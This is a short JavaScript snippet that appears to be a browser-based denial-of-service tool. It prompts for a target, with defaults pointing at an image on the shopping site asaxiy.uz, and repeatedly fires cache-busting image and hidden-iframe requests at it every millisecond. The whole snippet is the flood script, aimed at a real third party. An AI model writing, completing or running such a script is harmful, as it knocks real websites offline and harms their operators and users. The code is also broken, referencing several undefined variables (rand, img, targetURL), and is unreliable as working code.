var target = prompt("https://assets.asaxiy.uz/brand/webp//5e15c4ec85cf2.webp");
var speed = prompt("1");
var msg = prompt("asaxiy.uz");

function attack() {  
  var pic = new Image();
  var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  pic.src = 'http://'+target+"/?r="+rand;
    
    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';
  

                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
					img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);

}
setInterval(attack, speed);  
